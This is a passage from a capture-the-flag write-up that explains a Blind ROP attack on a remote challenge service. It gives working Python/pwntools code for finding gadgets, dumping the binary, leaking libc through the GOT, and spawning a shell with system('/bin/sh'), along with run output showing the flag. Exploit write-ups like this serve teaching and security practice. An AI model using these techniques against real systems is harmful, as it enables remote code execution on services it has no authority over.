        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">35</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_ - </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">base</span> <span class="o">+</span> <span class="n">i</span>

<span class="n">find_brop</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
</code></pre></div><p>Which returns:</p>
<pre tabindex="0"><code>$ ./solve.py
_ - 0x0
_ - 0x23
_ - 0x46
_ - 0x69
_ - 0x8c
_ - 0xaf
_ - 0xd2
_ - 0xf5
_ - 0x118
_ - 0x13b
_ - 0x15e
_ - 0x181
_ - 0x1a4
_ - 0x1c7
_ - 0x1ea
_ - 0x20d
_ - 0x230
_ - 0x253
_ - 0x276
_ - 0x299
_ - 0x2bc
_ - 0x2df
_ - 0x302
_ - 0x325
_ - 0x348
_ - 0x36b
_ - 0x38e
_ - 0x3b1
_ - 0x3d4
_ - 0x3f7
_ - 0x41a
_ - 0x43d
_ - 0x460
_ - 0x483
_ - 0x4a6
_ - 0x4c9
_ - 0x4ec
_ - 0x50f
_ - 0x532
_ - 0x555
_ - 0x578
_ - 0x59b
_ - 0x5be
_ - 0x5e1
_ - 0x604
_ - 0x627
_ - 0x64a
_ - 0x66d
_ - 0x690
_ - 0x6b3
_ - 0x6d6
_ - 0x6f9
_ - 0x71c
Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\x07@&gt;&gt;&gt; ', leak: 0x40073a
</code></pre><p>Since we got this gadget we can control <code>rdi</code> and <code>rsi</code> because of some misaligned instructions !</p>
<div class="gblog-post__anchorwrap">
    <h3 id="procedure-linkage-table-plt">
        Procedure linkage table (PLT)
        <a data-clipboard-text="https://nasm.re/posts/blindate/#procedure-linkage-table-plt" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Procedure linkage table (PLT)" href="#procedure-linkage-table-plt">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>The next step would be to leak the PLT to see if there is a puts, printf, or write functions.
To find the PLT there is three rules:</p>
<ul>
<li>The addresses of each stub are 16 bytes aligned</li>
<li>If we jmp one time on a candidate we can check it&rsquo;s a PLT entry by jumping at <code>entry+6</code> which is the address of the slowpath jump in the GOT. And so the behaviour should be the same.</li>
<li>We can give arguments like valid pointers in <code>rdi</code> and <code>rsi</code> to identify functions like puts, strcmp etc.</li>
</ul>
<p>I used so a payload&rsquo;s structure like this: <code>padding + POP_RDI + 0x400000 + POP_RSI_R15 + 0x400000 + probe + stop + trap</code>
That&rsquo;s how I developped this function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>

<span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">is_stop</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">ip</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">STOP_GADGETS</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">find_plt</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span> 
    <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span> 

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">):</span>
        <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span> <span class="c1"># I used the base address because it&#39;s an recognizable pattern</span>

        <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp1</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

        <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Out: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><p>And we got this:</p>
<pre tabindex="0"><code>$ ./solve.py
[0x400500] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201010a3e3e3e20
[0x400510] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201013e3e3e20
[0x400520] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400570] Out: 5468616e6b73204141414141414141414141414141414141414141414141414141414141414141414141414141414143074048656c6c6f20796f752e0a5768617420697320796f7572206e616d65203f0a3e3e3e20
[0x4005d0] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400610] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400630] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400640] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x4006e0] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400750] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
</code></pre><p>Awesome ! We got a leak of the binary in two gadgets !</p>
<div class="gblog-post__anchorwrap">
    <h3 id="leaking-the-binary">
        Leaking the binary
        <a data-clipboard-text="https://nasm.re/posts/blindate/#leaking-the-binary" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leaking the binary" href="#leaking-the-binary">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>Since we can leak an arbitrary location it&rsquo;s really easier !
We can see that the patter which leaks is like: <code>Thanks + padding + unpadd(p64(POP_RDI)) + leak_upto_null_byte</code>.
So we can leak all the binary from the base address:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>

<span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">dump_binary</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">base</span><span class="p">):</span>
    <span class="n">gadget_leak</span> <span class="o">=</span> <span class="mh">0x400510</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> 
    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>

    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>

    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;leet_dump.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;ab&#34;</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x400fff</span><span class="p">:</span> <span class="c1"># guessed end to the binary .text</span>
        <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget_leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span> <span class="c1"># somtimes there is no repsonse</span>
            <span class="k">continue</span>

        <span class="n">leak</span> <span class="o">=</span> <span class="n">resp1</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp1</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)]</span> <span class="c1"># get the leaked part</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">):</span> <span class="c1"># if no leak it means it&#39;s a null byte</span>
            <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: 0x00&#34;</span><span class="p">)</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span> <span class="c1"># else we got raw data leaked</span>
            <span class="n">buf</span> <span class="o">+=</span> <span class="n">leak</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">leak</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mh">0x100</span><span class="p">:</span> <span class="c1"># we write bytes to the file each 0x100 bytes</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
            <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Buffering ..&#34;</span><span class="p">)</span>
</code></pre></div><p>Because of my connection I have to relaunch the script with a different base address to dump the whole binary but anyway, it works !</p>
<pre tabindex="0"><code>$ ./solve.py
[skip]
[*] recv @ 0x400fff: 0x00
STOP: &lt;class 'KeyboardInterrupt'&gt;
$ ./solve.py
</code></pre><p>Since we dumped the binary we just need to build a classic ropchain by leaking the address of <code>FFLUSH</code> in the GOT and then compute the base address of the libc. It&rsquo;s interesting to see that we don&rsquo;t know what libc it is. So we can use <a
  class="gblog-markdown__link"
  href="https://libc.blukat.me/"
  
  >this</a
> to find from the offset of fflush and read, the right version. Which gives:</p>
<pre tabindex="0"><code>__libc_start_main 	0x021a50 	0x0
system 	0x041490 	0x1fa40
fflush 	0x069ab0 	0x48060
open 	0x0db950 	0xb9f00
read 	0x0dbb90 	0xba140
write 	0x0dbbf0 	0xba1a0
str_bin_sh 	0x1633e8 	0x141998
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="put-everything-together">
        Put everything together
        <a data-clipboard-text="https://nasm.re/posts/blindate/#put-everything-together" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Put everything together" href="#put-everything-together">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>I&rsquo;ll no detail a lot the final part because it&rsquo;s a basic rop payload. But since we got the right gadgets from the leaked binary, it&rsquo;s very easy. We have to notice that this exploit is not 100% reiable, if the address of FFLUSH in the GOT has a NULL byte the exploit will not work. Here is the final function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>

<span class="n">CSU_POP</span> <span class="o">=</span> <span class="mh">0x40073a</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>

<span class="n">GADGET_LEAK</span> <span class="o">=</span> <span class="mh">0x400510</span>
<span class="n">FFLUSH_GOT</span> <span class="o">=</span> <span class="mh">0x400000</span> <span class="o">+</span> <span class="mh">0x200FF0</span>
<span class="n">FFLUSH_OFFSET</span> <span class="o">=</span> <span class="mh">0x069ab0</span>
<span class="n">OFFT_BINSH</span> <span class="o">=</span> <span class="mh">0x1633e8</span>

<span class="n">SYSTEM</span> <span class="o">=</span> <span class="mh">0x041490</span>

<span class="k">def</span> <span class="nf">try_jmp_flow</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span><span class="p">,</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">flow</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">FFLUSH_GOT</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GADGET_LEAK</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span> <span class="o">+</span> <span class="mh">0x656</span><span class="p">)</span> <span class="c1"># ret2main</span>

    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
    <span class="n">resp_tmp</span><span class="p">,</span> <span class="n">io</span> <span class="o">=</span> <span class="n">try_jmp_flow</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">)</span>
    <span class="n">leak_fflush</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp_tmp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is&#39;</span><span class="p">)],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>

    <span class="n">libc</span> <span class="o">=</span> <span class="n">leak_fflush</span> <span class="o">-</span> <span class="n">FFLUSH_OFFSET</span> 
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">OFFT_BINSH</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">SYSTEM</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">flow</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
</code></pre></div><p>And when we run it, we got a shell yeeeeeah !</p>
<pre tabindex="0"><code>$ ./solve.py
b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\x07@\xb0J\xa2\xd7&lt;\x7fWhat is your name ?\n&gt;&gt;&gt; '
libc @ 0x7f3cd79bb000
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag
FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}
</code></pre><p>Here is the final script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>

<span class="n">CSU_POP</span> <span class="o">=</span> <span class="mh">0x40073a</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>

<span class="n">GADGET_LEAK</span> <span class="o">=</span> <span class="mh">0x400510</span>
<span class="n">FFLUSH_GOT</span> <span class="o">=</span> <span class="mh">0x400000</span> <span class="o">+</span> <span class="mh">0x200FF0</span>
<span class="n">FFLUSH_OFFSET</span> <span class="o">=</span> <span class="mh">0x069ab0</span>
<span class="n">OFFT_BINSH</span> <span class="o">=</span> <span class="mh">0x1633e8</span>

<span class="n">SYSTEM</span> <span class="o">=</span> <span class="mh">0x041490</span> 

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">__libc_start_main 	0x021a50 	0x0
</span><span class="s2">system 	0x041490 	0x1fa40
</span><span class="s2">fflush 	0x069ab0 	0x48060
</span><span class="s2">open 	0x0db950 	0xb9f00
</span><span class="s2">read 	0x0dbb90 	0xba140
</span><span class="s2">write 	0x0dbbf0 	0xba1a0
</span><span class="s2">str_bin_sh 	0x1633e8 	0x141998
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span><span class="p">,</span> <span class="mi">4008</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">padd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">is_crash</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="ow">not</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">is_stop</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
